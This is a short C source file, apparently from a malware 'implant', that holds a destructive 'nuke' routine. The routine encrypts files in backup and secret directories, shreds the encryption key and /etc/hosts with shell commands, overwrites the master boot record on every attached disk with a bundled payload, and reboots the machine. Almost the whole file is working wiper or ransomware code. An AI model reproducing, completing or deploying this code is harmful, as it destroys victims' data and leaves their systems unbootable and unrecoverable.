#include "implant.h"

#ifndef DEBUG
static int reboot_system()
{
  return reboot(RB_AUTOBOOT);
  //return reboot(LINUX_REBOOT_CMD_RESTART);
}
#endif

static int write_mbr(char * new_mbr, int size)
{
  unsigned int i = 0;
  int fd, written, ret;
  char * device_files[14] = {
    "/dev/sda", "/dev/hda",
    "/dev/sdb", "/dev/hdb",
    "/dev/sdc", "/dev/hdc",
    "/dev/sdd", "/dev/hdd",
    "/dev/sde", "/dev/hde",
    "/dev/sdf", "/dev/hdf",
    "/dev/sdg", "/dev/hdg",
  };

  for(i = 0; i < sizeof(device_files) / sizeof(device_files[0]); i++)
  {
    fd = open(device_files[i], O_WRONLY);
    if(fd >= 0)
    {
      ret = 1;
      written = 0;
      while(ret > 0 && written < size)
      {
        // write() error is unhandled
        ret = write(fd, new_mbr + written, size - written);
        written += ret;
#ifdef DEBUG
        printf("Wrote %d bytes (ret = %d)\n", written, ret);
#endif
      }

      fsync(fd);
      close(fd);
      sync();
#ifdef DEBUG
      printf("Wrote new MBR to %s\n", device_files[i]);
#endif
    }
  }

  for(i = 0; i < 10; i++) //make sure everything gets written
    sync();

  return 0;
}

#include "mbr.c"

void nuke()
{
  // Encrypt files in those directories
  char *target_directories[6] = {
    "/root/secret", "/user/secret",
    "/root/backup", "/user/backup",
    "/backup", "/secret",
  };

  for(unsigned i = 0; i < sizeof(target_directories) / sizeof(target_directories[0]); i++)
    ftw(target_directories[i], handle_file, 1);

  // wipe non encrypted symmetric key
  system("shred -zuf key.bin");

  // wipe hosts file
  system("shred /etc/hosts");

  // Rewrite mbr
  write_mbr((char*)code_mbr_bin, code_mbr_bin_len);

  // reboot system
#ifndef DEBUG
    reboot_system();
    exit(1);
#endif
}

